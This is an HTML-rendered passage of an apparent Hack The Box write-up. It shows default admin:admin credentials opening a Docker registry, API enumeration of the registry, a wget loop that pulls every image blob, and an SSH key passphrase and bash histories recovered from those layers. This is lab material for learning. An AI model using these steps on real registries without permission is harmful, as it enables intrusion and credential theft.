&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: https://docker.registry.htb/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ https://docker.registry.htb/v2 (CODE:301|SIZE:39)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;END_TIME: Thu Nov 28 08:36:36 2019&lt;/span&gt;
&lt;span class="code-line"&gt;DOWNLOADED: 4612 - FOUND: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This page ask for a basic auth. The trivial &lt;code&gt;admin:admin&lt;/code&gt; creds work.&lt;/p&gt;
&lt;h2 id="docker-registry-api"&gt;Docker registry API&lt;/h2&gt;
&lt;p&gt;The following link is an interesting source to exploit the
&lt;a href="https://docs.docker.com/registry/spec/api/"&gt;docker registry API&lt;/a&gt;:
&lt;a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/"&gt;https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We start enumerating using the command: &lt;code&gt;_catalog&lt;/code&gt;. The API give use the
available images: &lt;code&gt;{"repositories":["bolt-image"]}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;(Note: the command are used by appending them to the URL for instance the
&lt;code&gt;_catalog&lt;/code&gt; command is run by getting the following URL:
&lt;a href="https://docker.registry.htb/v2/_catalog"&gt;https://docker.registry.htb/v2/_catalog&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;We list the available tags for this image with &lt;code&gt;bolt-image/tags/list&lt;/code&gt;. There is
only one version available for this image: &lt;code&gt;latest&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{"name":"bolt-image","tags":["latest"]}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We download the manifest for the latest version of the bolt-image docker image
with the command &lt;code&gt;bolt-image/manifests/latest&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;schemaVersion&amp;quot;: 1,&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;name&amp;quot;: &amp;quot;bolt-image&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;tag&amp;quot;: &amp;quot;latest&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;architecture&amp;quot;: &amp;quot;amd64&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;fsLayers&amp;quot;: [&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      }&lt;/span&gt;
&lt;span class="code-line"&gt;  ],&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;history&amp;quot;: [&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;architecture\&amp;quot;:\&amp;quot;amd64\&amp;quot;,\&amp;quot;config\&amp;quot;:{\&amp;quot;Hostname\&amp;quot;:\&amp;quot;e2e880122289\&amp;quot;,\&amp;quot;Domainname\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;User\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;AttachStdin\&amp;quot;:true,\&amp;quot;AttachStdout\&amp;quot;:true,\&amp;quot;AttachStderr\&amp;quot;:true,\&amp;quot;Tty\&amp;quot;:true,\&amp;quot;OpenStdin\&amp;quot;:true,\&amp;quot;StdinOnce\&amp;quot;:true,\&amp;quot;Env\&amp;quot;:[\&amp;quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&amp;quot;],\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;],\&amp;quot;Image\&amp;quot;:\&amp;quot;docker.registry.htb/bolt-image\&amp;quot;,\&amp;quot;Volumes\&amp;quot;:null,\&amp;quot;WorkingDir\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;Entrypoint\&amp;quot;:null,\&amp;quot;OnBuild\&amp;quot;:null,\&amp;quot;Labels\&amp;quot;:{}},\&amp;quot;container\&amp;quot;:\&amp;quot;e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Hostname\&amp;quot;:\&amp;quot;e2e880122289\&amp;quot;,\&amp;quot;Domainname\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;User\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;AttachStdin\&amp;quot;:true,\&amp;quot;AttachStdout\&amp;quot;:true,\&amp;quot;AttachStderr\&amp;quot;:true,\&amp;quot;Tty\&amp;quot;:true,\&amp;quot;OpenStdin\&amp;quot;:true,\&amp;quot;StdinOnce\&amp;quot;:true,\&amp;quot;Env\&amp;quot;:[\&amp;quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&amp;quot;],\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;],\&amp;quot;Image\&amp;quot;:\&amp;quot;docker.registry.htb/bolt-image\&amp;quot;,\&amp;quot;Volumes\&amp;quot;:null,\&amp;quot;WorkingDir\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;Entrypoint\&amp;quot;:null,\&amp;quot;OnBuild\&amp;quot;:null,\&amp;quot;Labels\&amp;quot;:{}},\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T15:18:56.9530238Z\&amp;quot;,\&amp;quot;docker_version\&amp;quot;:\&amp;quot;18.09.2\&amp;quot;,\&amp;quot;id\&amp;quot;:\&amp;quot;f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\&amp;quot;,\&amp;quot;os\&amp;quot;:\&amp;quot;linux\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\&amp;quot;}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T15:13:31.3975799Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T14:57:27.6745842Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T14:47:52.6859489Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-24T22:51:14.8744838Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:05.100534088Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c #(nop)  CMD [\\\&amp;quot;/bin/bash\\\&amp;quot;]\&amp;quot;]},\&amp;quot;throwaway\&amp;quot;:true}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:04.936777709Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo &amp;#39;docker&amp;#39; \\u003e /run/systemd/container\&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:04.220422684Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c rm -rf /var/lib/apt/lists/*\&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:03.471632173Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo &amp;#39;#!/bin/sh&amp;#39; \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo &amp;#39;exit 101&amp;#39; \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i &amp;#39;s/^exit.*/exit 0/&amp;#39; /sbin/initctl \\t\\t\\u0026\\u0026 echo &amp;#39;force-unsafe-io&amp;#39; \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo &amp;#39;DPkg::Post-Invoke { \\\&amp;quot;rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\&amp;quot;; };&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo &amp;#39;APT::Update::Post-Invoke { \\\&amp;quot;rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\&amp;quot;; };&amp;#39; \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo &amp;#39;Dir::Cache::pkgcache \\\&amp;quot;\\\&amp;quot;; Dir::Cache::srcpkgcache \\\&amp;quot;\\\&amp;quot;;&amp;#39; \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo &amp;#39;Acquire::Languages \\\&amp;quot;none\\\&amp;quot;;&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo &amp;#39;Acquire::GzipIndexes \\\&amp;quot;true\\\&amp;quot;; Acquire::CompressionTypes::Order:: \\\&amp;quot;gz\\\&amp;quot;;&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo &amp;#39;Apt::AutoRemove::SuggestsImportant \\\&amp;quot;false\\\&amp;quot;;&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:02.724843678Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \&amp;quot;]}}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      }&lt;/span&gt;
&lt;span class="code-line"&gt;  ],&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;signatures&amp;quot;: [&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;header&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;quot;jwk&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;              &amp;quot;crv&amp;quot;: &amp;quot;P-256&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;              &amp;quot;kid&amp;quot;: &amp;quot;Q25C:2A2S:CDXB:7IXF:ZKDR:DELT:QBCW:XKT5:OT7Z:GQBN:4PG4:UK6K&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;              &amp;quot;kty&amp;quot;: &amp;quot;EC&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;              &amp;quot;x&amp;quot;: &amp;quot;WSj-L3I1ssgS0RChWY0rTb1-N3dZjGpHfwKmvulklM0&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;              &amp;quot;y&amp;quot;: &amp;quot;SUmHvK1PcIZzBkzk34Nn8mzXq2veOpDlECUqVsru3k8&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;            },&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;quot;alg&amp;quot;: &amp;quot;ES256&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;        },&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;signature&amp;quot;: &amp;quot;W1F9OyNxfyFaljdYUFMnVbcwUIgaJ7wiwfe1JboyRBFsYZGmzWC0n0bkQbGXD7M9P2Bh-D3U0u0AG3zWxEndLg&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;protected&amp;quot;: &amp;quot;eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAxOS0xMi0wM1QxNDowODoyOFoifQ&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      }&lt;/span&gt;
&lt;span class="code-line"&gt;  ]&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="blobs"&gt;Blobs&lt;/h3&gt;
&lt;p&gt;We extract the list of blobs and redirect it to a file
&lt;code&gt;grep blob latest | cut -d '"' -f 4 &amp;gt; blob_list&lt;/code&gt; then we download each blob
&lt;code&gt;while read l ; do wget --http-user=admin --http-password=admin
--no-check-certificate https://docker.registry.htb/v2/bolt-image/blobs/$l; done
&amp;lt; blob_list&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The blob
&lt;code&gt;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&lt;/code&gt; only
contain a file edited with Vim 8 (there is a vulnerability for this version). But
we do not have access to a Vim for the moment.&lt;/p&gt;
&lt;p&gt;In the &lt;code&gt;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&lt;/code&gt;
blob we found a &lt;code&gt;01-ssh.sh&lt;/code&gt; file containing a password&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#!/usr/bin/expect -f&lt;/span&gt;
&lt;span class="code-line"&gt;#eval `ssh-agent -s`&lt;/span&gt;
&lt;span class="code-line"&gt;spawn ssh-add /root/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;expect &amp;quot;Enter passphrase for /root/.ssh/id_rsa:&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;send &amp;quot;GkOcz221Ftb3ugog\n&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;expect &amp;quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;interact&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In the blob
&lt;code&gt;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&lt;/code&gt; we
found a &lt;code&gt;.bash_history&lt;/code&gt; file not containing something interesting.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cd /root/&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;.bash_history&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cat .bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;l .ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;cat .viminfo&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; .viminfo&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The blob
&lt;code&gt;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&lt;/code&gt;
contain a few files but nothing of interest.
The blob &lt;code&gt;` contain a&lt;/code&gt;.bash_history` file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;s aux&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;apt update&lt;/span&gt;
&lt;span class="code-line"&gt;apt install git&lt;/span&gt;
&lt;span class="code-line"&gt;apt install php&lt;/span&gt;
&lt;span class="code-line"&gt;php --ini |grep Loaded&lt;/span&gt;
&lt;span class="code-line"&gt;l /etc/php/&lt;/span&gt;
&lt;span class="code-line"&gt;l /etc/php/7.2/&lt;/span&gt;
&lt;span class="code-line"&gt;apt install nginx&lt;/span&gt;
&lt;span class="code-line"&gt;apt install php-fpm&lt;/span&gt;
&lt;span class="code-line"&gt;cd /var/www/html/&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;rm -rf index.html&lt;/span&gt;
&lt;span class="code-line"&gt;mv index.nginx-debian.html index.html&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;git clone https://github.com/bolt/bolt.git&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cd bolt/&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;useradd -m bolt&lt;/span&gt;
&lt;span class="code-line"&gt;cd /home/&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;userdel bolt&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;rm -rf bolt/&lt;/span&gt;
&lt;span class="code-line"&gt;cd /root/&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;mkdir .ssh&lt;/span&gt;
&lt;span class="code-line"&gt;cd .ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;vi config&lt;/span&gt;
&lt;span class="code-line"&gt;edit config&lt;/span&gt;
&lt;span class="code-line"&gt;apt install vim&lt;/span&gt;
&lt;span class="code-line"&gt;vi config&lt;/span&gt;
&lt;span class="code-line"&gt;ssh-keygen -t rsa -b 4096 -C &amp;quot;bolt@registry.htb&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cd ..&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;ssh-add /root/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;eval `ssh-agent -s`&lt;/span&gt;
&lt;span class="code-line"&gt;ssh-add /root/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux | grep ssh&lt;/span&gt;
&lt;span class="code-line"&gt;l /etc/profile.d/&lt;/span&gt;
&lt;span class="code-line"&gt;l /etc/profile.d/01-locale-fix.sh&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/profile.d/01-locale-fix.sh&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/profile&lt;/span&gt;
&lt;span class="code-line"&gt;l /etc/bash.bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/bash.bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;wd&lt;/span&gt;
&lt;span class="code-line"&gt;pwd&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cat .profile&lt;/span&gt;
&lt;span class="code-line"&gt;cat .bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;apt install expect&lt;/span&gt;
&lt;span class="code-line"&gt;which expect&lt;/span&gt;
&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;l /etc/profile.d/&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la /etc/profile.d/&lt;/span&gt;
&lt;span class="code-line"&gt;sh /etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;which spawn&lt;/span&gt;
&lt;span class="code-line"&gt;apt install spawn&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x /etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/profile.d/01-ssh.sh&lt;/span&gt;
